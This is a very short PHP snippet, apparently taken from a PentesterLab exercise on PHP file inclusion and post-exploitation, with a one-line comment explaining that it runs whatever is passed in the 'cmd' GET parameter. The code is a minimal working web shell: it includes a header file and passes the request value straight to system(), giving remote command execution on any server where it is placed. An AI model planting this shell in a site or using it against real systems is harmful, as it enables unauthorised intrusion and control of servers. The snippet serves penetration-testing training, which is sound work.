<!-- from https://pentesterlab.com/exercises/php_include_and_post_exploitation/course -->
will exec the arg specified in the GET parameter "cmd"
<?php
    include("../common/header.php");  
    system($_GET["cmd"]);
 ?>